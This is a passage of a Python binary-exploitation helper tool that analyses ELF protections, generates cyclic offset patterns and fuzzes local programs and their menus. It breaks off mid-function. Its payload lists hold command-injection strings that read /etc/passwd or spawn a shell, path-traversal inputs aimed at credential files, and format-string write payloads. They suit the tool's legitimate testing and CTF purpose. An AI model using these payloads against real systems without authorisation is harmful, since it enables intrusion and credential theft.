#!/usr/bin/env python3

import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import os
import time
import threading
import struct
import re
import json
import tempfile
import random
import signal
import hashlib
from datetime import datetime
import platform
import sys
from typing import Dict, List, Any, Optional, Tuple, Union
import traceback

try:
    from pwn import *
    context.log_level = 'error'
except ImportError:
    print("Warning: pwntools not installed. Some features may not work.")

class Logger:
    def __init__(self, log_callback=None):
        self.log_callback = log_callback
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted = f"[{timestamp}] [{level}] {message}"
        
        if self.log_callback:
            self.log_callback(formatted)
        else:
            print(formatted)

class DependencyChecker:
    @staticmethod
    def check_required_tools():
        required_tools = ['file', 'readelf', 'objdump', 'nm', 'strings']
        optional_tools = ['checksec', 'gdb', 'radare2']
        
        missing_required = []
        missing_optional = []
        
        for tool in required_tools:
            if not DependencyChecker._check_tool(tool):
                missing_required.append(tool)
        
        for tool in optional_tools:
            if not DependencyChecker._check_tool(tool):
                missing_optional.append(tool)
        
        return missing_required, missing_optional
    
    @staticmethod
    def _check_tool(tool_name):
        try:
            if platform.system() == 'Windows':
                subprocess.run(['where', tool_name], capture_output=True, check=True, timeout=2)
            else:
                subprocess.run(['which', tool_name], capture_output=True, check=True, timeout=2)
            return True
        except:
            return False

class PatternGenerator:
    @staticmethod
    def create(length: int) -> str:
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        chars += "abcdefghijklmnopqrstuvwxyz0123456789"
        
        pattern = ""
        a = b = c = 0
        
        while len(pattern) < length:
            pattern += chars[a] + chars[b] + chars[c]
            c += 1
            if c >= len(chars):
                c = 0
                b += 1
            if b >= len(chars):
                b = 0
                a += 1
            if a >= len(chars):
                a = 0
        
        return pattern[:length]
    
    @staticmethod
    def create_unique(length: int) -> bytes:
        pattern = b""
        for i in range(0, length, 4):
            value = 0x41414100 + (i // 4) % 256
            pattern += struct.pack('<I', value)
        return pattern[:length]
    
    @staticmethod
    def offset(value: Union[int, str, bytes], pattern_length: int = 10000) -> int:
        if isinstance(value, int):
            if value <= 0xFFFFFFFF:
                search_bytes = struct.pack('<I', value)
            else:
                search_bytes = struct.pack('<Q', value)
        elif isinstance(value, str):
            if value.startswith('0x'):
                hex_str = value[2:]
                if len(hex_str) % 2 != 0:
                    hex_str = '0' + hex_str
                try:
                    search_bytes = bytes.fromhex(hex_str)
                except ValueError:
                    return -1
            else:
                search_bytes = value.encode('latin-1', errors='ignore')
        elif isinstance(value, bytes):
            search_bytes = value
        else:
            return -1
        
        pattern = PatternGenerator.create(pattern_length).encode('latin-1', errors='ignore')
        pattern_unique = PatternGenerator.create_unique(pattern_length)
        
        if search_bytes in pattern:
            return pattern.index(search_bytes)
        if search_bytes in pattern_unique:
            return pattern_unique.index(search_bytes)
        
        if len(search_bytes) == 4:
            search_rev = search_bytes[::-1]
            if search_rev in pattern:
                return pattern.index(search_rev)
            if search_rev in pattern_unique:
                return pattern_unique.index(search_rev)
        
        return -1

class BinaryRunner:
    def __init__(self, binary_path: str):
        if not os.path.exists(binary_path):
            raise FileNotFoundError(f"Binary not found: {binary_path}")
        if not os.access(binary_path, os.X_OK):
            os.chmod(binary_path, 0o755)
        
        self.binary = binary_path
        self.process = None
        self.timeout = 5
        self.cleanup_processes = []
    
    def _cleanup(self):
        for pid in self.cleanup_processes:
            try:
                if platform.system() == 'Windows':
                    os.kill(pid, signal.SIGTERM)
                else:
                    os.killpg(os.getpgid(pid), signal.SIGKILL)
            except:
                pass
        self.cleanup_processes = []
    
    def _create_process(self, **kwargs):
        kwargs.setdefault('stdin', subprocess.PIPE)
        kwargs.setdefault('stdout', subprocess.PIPE)
        kwargs.setdefault('stderr', subprocess.PIPE)
        kwargs.setdefault('text', False)
        
        if platform.system() == 'Windows':
            kwargs['creationflags'] = subprocess.CREATE_NEW_PROCESS_GROUP
            preexec_fn = None
        else:
            preexec_fn = os.setsid
            kwargs['preexec_fn'] = preexec_fn
        
        try:
            self.process = subprocess.Popen([self.binary], **kwargs)
            if preexec_fn is None:
                self.cleanup_processes.append(self.process.pid)
            return True
        except Exception as e:
            raise RuntimeError(f"Failed to create process: {e}")
    
    def _kill_process(self):
        if self.process:
            try:
                if platform.system() == 'Windows':
                    self.process.terminate()
                else:
                    os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                
                for _ in range(10):
                    if self.process.poll() is not None:
                        break
                    time.sleep(0.1)
                
                if self.process.poll() is None:
                    if platform.system() == 'Windows':
                        self.process.kill()
                    else:
                        os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
                
                self.process.wait(timeout=1)
            except:
                pass
            finally:
                self.process = None
    
    def run(self, input_data: Union[str, bytes] = b"", timeout: int = None) -> Dict[str, Any]:
        if timeout is None:
            timeout = self.timeout
        
        try:
            if not self._create_process():
                return {'success': False, 'error': 'Process creation failed'}
            
            if isinstance(input_data, str):
                input_bytes = input_data.encode('utf-8', errors='ignore')
            else:
                input_bytes = input_data
            
            stdout, stderr = self.process.communicate(input=input_bytes, timeout=timeout)
            
            stdout_str = self._decode_output(stdout)
            stderr_str = self._decode_output(stderr)
            
            return {
                'success': True,
                'stdout': stdout_str,
                'stderr': stderr_str,
                'returncode': self.process.returncode,
                'crashed': self._is_crash(self.process.returncode),
                'signal': -self.process.returncode if self.process.returncode < 0 else None
            }
            
        except subprocess.TimeoutExpired:
            self._kill_process()
            return {'success': False, 'timeout': True}
        except Exception as e:
            self._kill_process()
            return {'success': False, 'error': str(e)}
        finally:
            self._cleanup()
    
    def run_interactive(self, inputs: List[Union[str, bytes]], timeout: int = None) -> Dict[str, Any]:
        if timeout is None:
            timeout = self.timeout
        
        try:
            if not self._create_process():
                return {'success': False, 'error': 'Process creation failed'}
            
            output_parts = []
            
            for inp in inputs:
                if isinstance(inp, str):
                    inp_bytes = inp.encode('utf-8', errors='ignore')
                else:
                    inp_bytes = inp
                
                self.process.stdin.write(inp_bytes + b'\n')
                self.process.stdin.flush()
                
                time.sleep(0.1)
                
                while True:
                    try:
                        chunk = self.process.stdout.read1(1024)
                        if chunk:
                            output_parts.append(self._decode_output(chunk))
                        else:
                            break
                    except:
                        break
            
            stdout, stderr = self.process.communicate(timeout=timeout)
            output_parts.append(self._decode_output(stdout))
            output_parts.append(self._decode_output(stderr))
            
            return {
                'success': True,
                'output': ''.join(output_parts),
                'returncode': self.process.returncode,
                'crashed': self._is_crash(self.process.returncode)
            }
            
        except subprocess.TimeoutExpired:
            self._kill_process()
            return {'success': False, 'timeout': True}
        except Exception as e:
            self._kill_process()
            return {'success': False, 'error': str(e)}
        finally:
            self._cleanup()
    
    def _decode_output(self, data: bytes) -> str:
        encodings = ['utf-8', 'latin-1', 'ascii', 'cp1252']
        for encoding in encodings:
            try:
                return data.decode(encoding, errors='ignore')
            except UnicodeDecodeError:
                continue
        return data.decode('utf-8', errors='replace')
    
    def _is_crash(self, returncode: int) -> bool:
        if returncode is None:
            return False
        if platform.system() != 'Windows' and returncode < 0:
            return True
        crash_codes = [-11, -6, -10, -4]
        return returncode in crash_codes or returncode > 128

class BinaryAnalyzer:
    def __init__(self, binary_path: str):
        self.binary = binary_path
        self.logger = Logger()
        self.info = {}
    
    def analyze(self) -> Dict[str, Any]:
        self.info = {
            'basic_info': self._get_basic_info(),
            'architecture': self._get_architecture(),
            'protections': self._get_protections(),
            'sections': self._get_sections(),
            'symbols': self._get_symbols(),
            'imports': self._get_imports(),
            'strings': self._get_strings(),
            'entry_point': self._get_entry_point()
        }
        return self.info
    
    def _run_command(self, cmd: List[str]) -> Dict[str, Any]:
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10,
                errors='ignore'
            )
            return {
                'success': True,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_basic_info(self) -> Dict[str, str]:
        result = self._run_command(['file', self.binary])
        if result['success']:
            return {'file_info': result['stdout'].strip()}
        return {'file_info': 'Unknown'}
    
    def _get_architecture(self) -> Dict[str, str]:
        result = self._run_command(['readelf', '-h', self.binary])
        if result['success']:
            output = result['stdout']
            arch_info = {'arch': 'unknown', 'bits': 0, 'endian': 'unknown'}
            
            if 'ELF64' in output:
                arch_info['bits'] = 64
            elif 'ELF32' in output:
                arch_info['bits'] = 32
            
            if 'LSB' in output:
                arch_info['endian'] = 'little'
            elif 'MSB' in output:
                arch_info['endian'] = 'big'
            
            if 'x86-64' in output or '64-bit' in output:
                arch_info['arch'] = 'x64'
            elif '80386' in output or 'Intel 80386' in output:
                arch_info['arch'] = 'x86'
            elif 'ARM' in output:
                arch_info['arch'] = 'ARM' + ('64' if arch_info['bits'] == 64 else '')
            elif 'MIPS' in output:
                arch_info['arch'] = 'MIPS'
            elif 'PowerPC' in output:
                arch_info['arch'] = 'PPC'
            
            return arch_info
        return {'arch': 'unknown', 'bits': 0, 'endian': 'unknown'}
    
    def _get_protections(self) -> Dict[str, str]:
        protections = {
            'NX': 'Unknown',
            'PIE': 'Unknown',
            'Canary': 'Unknown',
            'RELRO': 'Unknown',
            'FORTIFY': 'Unknown'
        }
        
        checksec_cmds = [
            ['checksec', '--file=' + self.binary],
            ['bash', '-c', f'checksec --file="{self.binary}" 2>/dev/null']
        ]
        
        for cmd in checksec_cmds:
            result = self._run_command(cmd)
            if result['success'] and result['stdout'].strip():
                output = result['stdout']
                
                if 'NX enabled' in output:
                    protections['NX'] = 'YES'
                elif 'NX disabled' in output:
                    protections['NX'] = 'NO'
                
                if 'PIE enabled' in output:
                    protections['PIE'] = 'YES'
                elif 'No PIE' in output:
                    protections['PIE'] = 'NO'
                
                if 'Canary found' in output:
                    protections['Canary'] = 'YES'
                elif 'No canary found' in output:
                    protections['Canary'] = 'NO'
                
                if 'Full RELRO' in output:
                    protections['RELRO'] = 'FULL'
                elif 'Partial RELRO' in output:
                    protections['RELRO'] = 'PARTIAL'
                elif 'No RELRO' in output:
                    protections['RELRO'] = 'NO'
                
                if 'Yes' in output and 'FORTIFY' in output:
                    protections['FORTIFY'] = 'YES'
                elif 'No' in output and 'FORTIFY' in output:
                    protections['FORTIFY'] = 'NO'
                
                if all(v != 'Unknown' for v in protections.values()):
                    return protections
        
        self._check_protections_fallback(protections)
        return protections
    
    def _check_protections_fallback(self, protections: Dict[str, str]):
        result = self._run_command(['readelf', '-l', self.binary])
        if result['success']:
            for line in result['stdout'].split('\n'):
                if 'GNU_STACK' in line:
                    protections['NX'] = 'NO' if 'RWE' in line else 'YES'
                    break
        
        result = self._run_command(['readelf', '-h', self.binary])
        if result['success']:
            if 'DYN' in result['stdout']:
                protections['PIE'] = 'YES'
            else:
                protections['PIE'] = 'NO'
        
        result = self._run_command(['readelf', '-s', self.binary])
        if result['success']:
            if '__stack_chk_fail' in result['stdout'] or '__stack_chk_guard' in result['stdout']:
                protections['Canary'] = 'YES'
            else:
                protections['Canary'] = 'NO'
        
        result = self._run_command(['readelf', '-d', self.binary])
        if result['success']:
            if 'BIND_NOW' in result['stdout']:
                protections['RELRO'] = 'FULL'
            elif 'DEBUG' in result['stdout']:
                protections['RELRO'] = 'PARTIAL'
            else:
                protections['RELRO'] = 'NO'
    
    def _get_sections(self) -> List[Dict[str, str]]:
        sections = []
        result = self._run_command(['readelf', '-S', '--wide', self.binary])
        
        if result['success']:
            lines = result['stdout'].split('\n')[3:]
            for line in lines:
                parts = line.split()
                if len(parts) >= 7:
                    sections.append({
                        'name': parts[1].strip('[]'),
                        'type': parts[2],
                        'address': parts[3],
                        'offset': parts[4],
                        'size': parts[5],
                        'flags': parts[6] if len(parts) > 6 else ''
                    })
        
        return sections[:15]
    
    def _get_symbols(self) -> Dict[str, List[Dict[str, str]]]:
        symbols = {'functions': [], 'variables': []}
        
        # Try objdump disassembly first - most reliable
        result = self._run_command(['objdump', '-d', self.binary])
        if result['success']:
            import re
            # Match lines like: "0000000000001000 <function_name>:"
            pattern = re.compile(r'^([0-9a-f]+)\s+<(.+?)>:')
            
            for line in result['stdout'].split('\n'):
                match = pattern.match(line.strip())
                if match:
                    addr_str = match.group(1)
                    func_name = match.group(2)
                    
                    try:
                        addr = '0x' + addr_str.lstrip('0') if addr_str else '0x0'
                        
                        # Add actual functions
                        if func_name and not func_name.startswith('.'):
                            symbols['functions'].append({
                                'address': addr,
                                'name': func_name,
                                'type': 'function'
                            })
                    except:
                        pass
        
        # Try nm as secondary source
        if len(symbols['functions']) < 5:
            result = self._run_command(['nm', '-n', self.binary])
            if result['success']:
                for line in result['stdout'].split('\n'):
                    if not line.strip():
                        continue
                    
                    parts = line.split()
                    if len(parts) >= 3:
                        try:
                            addr_str = parts[0]
                            symbol_type = parts[1]
                            symbol_name = ' '.join(parts[2:])
                            
                            # Convert to hex format
                            addr = '0x' + addr_str if not addr_str.startswith('0x') else addr_str
                            
                            if symbol_type in ('T', 't'):
                                # Check if not already in list
                                if not any(f['name'] == symbol_name for f in symbols['functions']):
                                    symbols['functions'].append({
                                        'address': addr,
                                        'name': symbol_name,
                                        'type': 'function'
                                    })
                            elif symbol_type in ('D', 'd', 'B', 'b'):
                                symbols['variables'].append({
                                    'address': addr,
                                    'name': symbol_name,
                                    'type': 'data'
                                })
                        except:
                            pass
        
        # Try readelf as last resort
        if len(symbols['functions']) < 5:
            result = self._run_command(['readelf', '-s', self.binary])
            if result['success']:
                for line in result['stdout'].split('\n'):
                    parts = line.split()
                    if len(parts) >= 8:
                        try:
                            addr = parts[2]
                            sym_type = parts[4]
                            sym_name = parts[-1]
                            
                            if sym_type == 'FUNC' and sym_name not in ('', '.text', '.data'):
                                addr_fmt = '0x' + addr.lstrip('0x')
                                if not any(f['name'] == sym_name for f in symbols['functions']):
                                    symbols['functions'].append({
                                        'address': addr_fmt,
                                        'name': sym_name,
                                        'type': 'function'
                                    })
                        except:
                            pass
        
        # Remove duplicates and sort
        seen = set()
        unique_funcs = []
        for func in symbols['functions']:
            key = (func['address'], func['name'])
            if key not in seen:
                seen.add(key)
                unique_funcs.append(func)
        
        symbols['functions'] = unique_funcs
        symbols['functions'].sort(key=lambda x: int(x['address'], 16) if x['address'].startswith('0x') else 0)
        symbols['variables'].sort(key=lambda x: int(x['address'], 16) if x['address'].startswith('0x') else 0)
        
        return symbols
    
    def _get_imports(self) -> List[Dict[str, str]]:
        imports = []
        result = self._run_command(['readelf', '-s', self.binary])
        
        if result['success']:
            for line in result['stdout'].split('\n'):
                if 'UND' in line and '@' in line:
                    parts = line.split()
                    if len(parts) >= 8:
                        imports.append({
                            'address': parts[1],
                            'type': 'import',
                            'name': parts[7].split('@')[0]
                        })
        
        return imports[:20]
    
    def _get_strings(self) -> List[Dict[str, str]]:
        strings = []
        result = self._run_command(['strings', '-n', '4', self.binary])
        
        if result['success']:
            for s in result['stdout'].split('\n'):
                if s.strip():
                    strings.append({
                        'string': s,
                        'length': len(s),
                        'type': 'ascii' if s.isascii() else 'binary'
                    })
        
        return strings[:50]
    
    def _get_entry_point(self) -> str:
        result = self._run_command(['readelf', '-h', self.binary])
        if result['success']:
            for line in result['stdout'].split('\n'):
                if 'Entry point address:' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        return parts[1].strip()
        return 'unknown'

class VulnerabilityScanner:
    def __init__(self, binary_path: str):
        self.binary = binary_path
        self.runner = BinaryRunner(binary_path)
        self.pattern_gen = PatternGenerator()
        self.results = {
            'buffer_overflow': [],
            'format_string': [],
            'command_injection': [],
            'integer_overflow': [],
            'heap_vulnerabilities': [],
            'info_leaks': []
        }
    
    def scan(self, depth: int = 3) -> Dict[str, Any]:
        self.log("Starting vulnerability scan (depth: {depth})")
        
        self._static_analysis()
        
        if depth >= 1:
            self._dynamic_analysis_basic()
        
        if depth >= 2:
            self._dynamic_analysis_advanced()
        
        if depth >= 3:
            self._interactive_analysis()
        
        return self._summarize_results()
    
    def _static_analysis(self):
        analyzer = BinaryAnalyzer(self.binary)
        info = analyzer.analyze()
        
        dangerous_functions = [
            'strcpy', 'strcat', 'gets', 'scanf', 'printf', 'sprintf',
            'system', 'exec', 'popen', 'malloc', 'free', 'strncpy',
            'memcpy', 'strlen', 'read', 'write', 'open', 'close'
        ]
        
        symbols = info.get('symbols', {}).get('functions', [])
        imports = info.get('imports', [])
        
        for func_list, source in [(symbols, 'internal'), (imports, 'imported')]:
            for func in func_list:
                func_name = func.get('name', '').lower()
                for danger in dangerous_functions:
                    if danger in func_name:
                        self.results['buffer_overflow'].append({
                            'type': 'dangerous_function',
                            'function': func_name,
                            'address': func.get('address', 'unknown'),
                            'source': source,
                            'severity': 'high' if danger in ['strcpy', 'gets', 'system'] else 'medium',
                            'description': f'Found dangerous function: {func_name}'
                        })
        
        protections = info.get('protections', {})
        if protections.get('Canary') == 'NO':
            self.results['buffer_overflow'].append({
                'type': 'no_stack_canary',
                'severity': 'high',
                'description': 'Stack protection (Stack Canary) not enabled'
            })
        
        if protections.get('NX') == 'NO':
            self.results['buffer_overflow'].append({
                'type': 'no_nx',
                'severity': 'medium',
                'description': 'NX protection (Data Execution Prevention) not enabled'
            })
        
        if protections.get('PIE') == 'NO':
            self.results['info_leaks'].append({
                'type': 'no_pie',
                'severity': 'low',
                'description': 'PIE (Address Space Layout Randomization) not enabled'
            })
    
    def _dynamic_analysis_basic(self):
        self._test_buffer_overflow()
        self._test_format_string()
    
    def _test_buffer_overflow(self):
        test_sizes = [50, 100, 200, 500, 1000, 2000]
        
        for size in test_sizes:
            pattern = PatternGenerator.create(size)
            
            result = self.runner.run(pattern)
            if result.get('crashed'):
                # offset = PatternGenerator.offset('AAAA') # REMOVED: Incorrect assumption
                
                self.results['buffer_overflow'].append({
                    'type': 'dynamic_overflow',
                    'size': size,
                    'offset': 'Unknown (Use Offset Calculator)', 
                    'crashed': True,
                    'signal': result.get('signal'),
                    'severity': 'critical',
                    'description': f'Buffer overflow caused crash, size: {size} bytes. Use "Offset Calculation" tab to find exact offset.'
                })
                break
    
    def _test_format_string(self):
        test_payloads = [
            ("%p " * 20, "Pointer leak test"),
            ("%x " * 30, "Hexadecimal dump test"),
            ("AAAA %p %p %p %p %p", "Simple leak test"),
            ("%s", "String leak test")
        ]
        
        for payload, desc in test_payloads:
            result = self.runner.run(payload)
            if result.get('success'):
                output = result.get('stdout', '')
                
                leak_indicators = ['0x7f', '0x55', '0x41', '41414141']
                if any(indicator in output.lower() for indicator in leak_indicators):
                    self.results['format_string'].append({
                        'type': 'format_leak',
                        'test': desc,
                        'leak_detected': True,
                        'severity': 'medium',
                        'description': f'Format string vulnerability: {desc}'
                    })
                    break
    
    def _dynamic_analysis_advanced(self):
        test_payloads = [
            "; ls",
            "| ls",
            "`ls`",
            "$(ls)",
            "|| ls",
            "&& ls"
        ]
        
        for payload in test_payloads:
            result = self.runner.run(payload)
            if result.get('success'):
                output = result.get('stdout', '')
                if any(x in output for x in ['bin', 'etc', 'home', 'usr']):
                    self.results['command_injection'].append({
                        'type': 'command_injection',
                        'payload': payload,
                        'severity': 'critical',
                        'description': f'Command injection vulnerability: {payload}'
                    })
                    break
    
    def _interactive_analysis(self):
        test_inputs = ['\n', 'help\n', '?\n', 'menu\n', '1\n', '2\n', '3\n']
        
        for inp in test_inputs:
            result = self.runner.run(inp)
            if result.get('success'):
                output = result.get('stdout', '')
                
                menu_patterns = [
                    r'^\s*(\d+)\.\s+(.+)$',
                    r'^\s*\[\s*(\d+)\s*\]\s+(.+)$',
                    r'^\s*Option\s+(\d+):\s+(.+)$'
                ]
                
                for pattern in menu_patterns:
                    matches = re.findall(pattern, output, re.MULTILINE)
                    if matches:
                        for match in matches:
                            self.results['info_leaks'].append({
                                'type': 'menu_structure',
                                'option': match[0],
                                'description': match[1],
                                'severity': 'info',
                                'description': f'Found menu option: {match[0]}. {match[1]}'
                            })
    
    def _summarize_results(self) -> Dict[str, Any]:
        summary = {
            'total_vulnerabilities': 0,
            'by_type': {},
            'by_severity': {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0},
            'details': self.results
        }
        
        for vuln_type, vulns in self.results.items():
            summary['by_type'][vuln_type] = len(vulns)
            summary['total_vulnerabilities'] += len(vulns)
            
            for vuln in vulns:
                severity = vuln.get('severity', 'medium')
                if severity in summary['by_severity']:
                    summary['by_severity'][severity] += 1
        
        return summary
    
    def log(self, message):
        print(f"[VulnerabilityScanner] {message}")

class Fuzzer:
    def __init__(self, binary_path: str):
        self.binary = binary_path
        self.runner = BinaryRunner(binary_path)
        self.crashes = []
        self.hangs = []
        self.unique_crashes = set()
        self.stop_flag = False
    
    def fuzz(self, max_cases: int = 1000) -> Dict[str, Any]:
        test_cases = self._generate_test_cases()
        
        for i, test_case in enumerate(test_cases[:max_cases]):
            if self.stop_flag:
                break
            
            if i % 100 == 0:
                print(f"Tested {i}/{max_cases} test cases...")
            
            result = self.runner.run(test_case, timeout=2)
            
            if result.get('timeout'):
                self.hangs.append({
                    'input': test_case[:100],
                    'length': len(test_case),
                    'test_id': i
                })
            
            if result.get('crashed'):
                crash_hash = self._hash_crash(result)
                if crash_hash not in self.unique_crashes:
                    self.unique_crashes.add(crash_hash)
                    self.crashes.append({
                        'input': test_case[:100],
                        'length': len(test_case),
                        'returncode': result.get('returncode'),
                        'signal': result.get('signal'),
                        'test_id': i
                    })
        
        return {
            'total_tests': min(max_cases, len(test_cases)),
            'crashes': self.crashes,
            'unique_crashes': len(self.unique_crashes),
            'hangs': self.hangs,
            'crash_rate': len(self.crashes) / max(1, min(max_cases, len(test_cases)))
        }
    
    def _generate_test_cases(self) -> List[bytes]:
        test_cases = []
        
        boundaries = [0, 1, -1, 2147483647, -2147483648]
        for b in boundaries:
            test_cases.append(str(b).encode())
        
        strings = [
            b"",
            b"A" * 10,
            b"A" * 100,
            b"A" * 1000,
            b"%p" * 50,
            b"%n" * 20,
            b"%s" * 30,
            b"\x00" * 10,
            b"\xff" * 10,
            b"\n" * 5,
            b"\t" * 10,
            b"../../etc/passwd",
            b";/bin/sh",
            b"`id`",
            b"$(whoami)"
        ]
        test_cases.extend(strings)
        
        for _ in range(500):
            length = random.randint(1, 2000)
            if random.choice([True, False]):
                test_case = bytes(random.getrandbits(8) for _ in range(length))
            else:
                chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%$#@!&*"
                test_case = ''.join(random.choice(chars) for _ in range(length)).encode()
            test_cases.append(test_case)
        
        for length in [100, 500, 1000, 2000]:
            pattern = PatternGenerator.create(length).encode()
            test_cases.append(pattern)
        
        return test_cases
    
    def _hash_crash(self, result: Dict[str, Any]) -> str:
        components = [
            str(result.get('returncode')),
            str(result.get('signal'))
        ]
        return hashlib.md5(''.join(components).encode()).hexdigest()
    
    def stop(self):
        self.stop_flag = True
        if self.runner.process:
            self.runner._kill_process()

class IntelligentFuzzer:
    def __init__(self, binary_path: str):
        self.binary = binary_path
        self.runner = BinaryRunner(binary_path)
        self.pattern_gen = PatternGenerator()
        self.menu_structure = {}
        self.input_points = []
        self.crashes = []
        self.leaks = []
        self.offsets = {}
        self.discovered_options = []
        self.state = "initial"
        self.stop_flag = False
        
    def discover_menu(self, max_depth: int = 3) -> Dict[str, Any]:
        print("[*] Discovering menu structure...")
        
        test_inputs = [
            "", "\n", "help\n", "?\n", "menu\n", "options\n",
            "1\n", "2\n", "3\n", "4\n", "5\n",
            "a\n", "b\n", "c\n", "A\n", "B\n", "C\n"
        ]
        
        for inp in test_inputs:
            if self.stop_flag:
                break
                
            result = self.runner.run(inp)
            if not result.get('success'):
                continue
                
            output = result.get('stdout', '') + result.get('stderr', '')
            self._analyze_output_for_menu(output, inp)
        
        self._explore_options(max_depth)
        
        return {
            'menu_structure': self.menu_structure,
            'input_points': self.input_points,
            'discovered_options': self.discovered_options
        }
    
    def _analyze_output_for_menu(self, output: str, input_sent: str):
        menu_patterns = [
            r'^\s*(\d+)\.\s+(.+)$',
            r'^\s*\[\s*(\d+)\s*\]\s+(.+)$',
            r'^\s*Option\s+(\d+):\s+(.+)$',
            r'^\s*(\w+)\)\s+(.+)$',
            r'^\s*>\s*(.+)$',
            r'^\s*-\s*(.+)$',
        ]
        
        lines = output.split('\n')
        for line in lines:
            line = line.strip()
            if not line or len(line) < 2:
                continue
            
            prompt_indicators = ['Enter', 'Input', 'Choice', 'Select', ':', '>', '$', '#']
            if any(indicator in line for indicator in prompt_indicators):
                self.input_points.append({
                    'prompt': line,
                    'state': self.state,
                    'input_sent': input_sent
                })
            
            for pattern in menu_patterns:
                match = re.match(pattern, line)
                if match:
                    option = match.group(1).strip()
                    description = match.group(2).strip()
                    
                    if option not in self.menu_structure:
                        self.menu_structure[option] = {
                            'description': description,
                            'tested': False,
                            'leads_to_input': False
                        }
                        self.discovered_options.append(option)
    
    def _explore_options(self, max_depth: int):
        print(f"[*] Exploring {len(self.discovered_options)} discovered options...")
        
        for option in self.discovered_options[:10]:
            if self.stop_flag:
                break
            
            print(f"[*] Testing option: {option}")
            result = self.runner.run(f"{option}\n")
            
            if result.get('success'):
                output = result.get('stdout', '')
                self._analyze_output_for_menu(output, option)
                
                prompts_found = [
                    'Enter', 'Input', 'Choice', 'Select', 
                    'name', 'data', 'string', 'value',
                    ':', '>', '?'
                ]
                if any(prompt in output for prompt in prompts_found):
                    self.menu_structure[option]['leads_to_input'] = True
                    self._test_input_point(option, output)
    
    def _test_input_point(self, option: str, context_output: str):
        print(f"[*] Testing input point after option: {option}")
        
        self.runner.run(f"{option}\n")
        
        test_payloads = [
            ("A" * 100, "Long string test"),
            ("%p" * 10, "Format string leak test"),
            ("%n" * 5, "Format string write test"),
            ("\x00" * 50, "Null byte test"),
            ("../../etc/passwd", "Path traversal test"),
            ("'; ls;'", "Command injection test"),
        ]
        
        for payload, desc in test_payloads:
            if self.stop_flag:
                break
                
            result = self.runner.run_interactive([f"{option}\n", f"{payload}\n"])
            
            if result.get('crashed'):
                self._analyze_crash(payload, result, option)
                break
            elif result.get('success'):
                self._analyze_output_for_leaks(result.get('output', ''), payload, option)
    
    def fuzz_menu_option(self, option: str, input_text: str, test_count: int = 500) -> Dict[str, Any]:
        print(f"[*] Fuzzing option '{option}' with input field...")
        
        crashes = []
        leaks = []
        unique_crashes = set()
        
        test_cases = self._generate_smart_test_cases()
        
        for i, test_case in enumerate(test_cases[:test_count]):
            if self.stop_flag:
                break
                
            if i % 50 == 0:
                print(f"[*] Tested {i}/{test_count} cases for option {option}")
            
            inputs = [f"{option}\n", f"{test_case}\n"]
            result = self.runner.run_interactive(inputs)
            
            if result.get('crashed'):
                crash_hash = self._hash_crash(result)
                if crash_hash not in unique_crashes:
                    unique_crashes.add(crash_hash)
                    crash_info = {
                        'option': option,
                        'input': test_case[:100] if isinstance(test_case, str) else str(test_case)[:100],
                        'length': len(test_case) if isinstance(test_case, (str, bytes)) else 0,
                        'returncode': result.get('returncode'),
                        'signal': result.get('signal'),
                        'test_id': i,
                        'offset_info': self._calculate_offset(test_case, result)
                    }
                    crashes.append(crash_info)
            
            elif result.get('success'):
                leak_info = self._detect_leaks(result.get('output', ''), test_case, option)
                if leak_info:
                    leaks.append(leak_info)
        
        return {
            'option': option,
            'total_tests': min(test_count, len(test_cases)),
            'crashes': crashes,
            'leaks': leaks,
            'unique_crashes': len(unique_crashes)
        }
    
    def _generate_smart_test_cases(self) -> List[Union[str, bytes]]:
        test_cases = []
        
        for length in [64, 128, 256, 512, 1024, 2048, 4096]:
            test_cases.append("A" * length)
            test_cases.append(PatternGenerator.create(length))
            test_cases.append(PatternGenerator.create_unique(length))
        
        for i in range(1, 20):
            test_cases.append(f"%{i}$p")
            test_cases.append(f"%{i}$s")
            test_cases.append(f"%{i}$n")
        
        test_cases.extend([
            "%p " * 50,
            "%x " * 50,
            "%s" * 30,
            "%n" * 20,
        ])
        
        test_cases.extend([
            "-1", "0", "2147483647", "2147483648", "-2147483648", "-2147483649",
            "9999999999", "-9999999999", "0xffffffff", "0x100000000"
        ])
        
        injections = [
            "; ls;", "| ls", "`ls`", "$(ls)", "|| ls", "&& ls",
            "; cat /etc/passwd;", "| cat /etc/passwd",
            "'; sh;'", '\"; sh;\"'
        ]
        test_cases.extend(injections)
        
        paths = [
            "../../etc/passwd", "/etc/passwd", "..\\..\\windows\\system32\\config\\SAM",
            "file:///etc/passwd", "\\..\\..\\etc\\passwd"
        ]
        test_cases.extend(paths)
        
        specials = [
            "\x00" * 50,
            "\xff" * 50,
            "\n" * 10,
            "\r\n" * 10,
            "\t" * 20,
        ]
        test_cases.extend(specials)
        
        for _ in range(200):
            length = random.randint(1, 2000)
            if random.choice([True, False]):
                test_case = bytes([random.randint(0, 255) for _ in range(length)])
            else:
                chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/`~"
                test_case = ''.join(random.choice(chars) for _ in range(length))
            test_cases.append(test_case)
        
        return test_cases
    
    def _analyze_crash(self, payload: str, result: Dict[str, Any], context: str = ""):
        print(f"[*] Crash detected! Analyzing...")
        
        crash_info = {
            'context': context,
            'payload': payload[:100],
            'returncode': result.get('returncode'),
            'signal': result.get('signal'),
            'vulnerability_type': 'unknown'
        }
        
        if isinstance(payload, str) and payload.startswith(("A" * 50, "AAAA")):
            offset = self._find_offset_from_crash(payload, result)
            if offset != -1:
                crash_info['offset'] = offset
                crash_info['vulnerability_type'] = 'buffer_overflow'
                print(f"[+] Buffer overflow at offset: {offset}")
        
        elif '%' in str(payload):
            crash_info['vulnerability_type'] = 'format_string'
            if '%n' in str(payload):
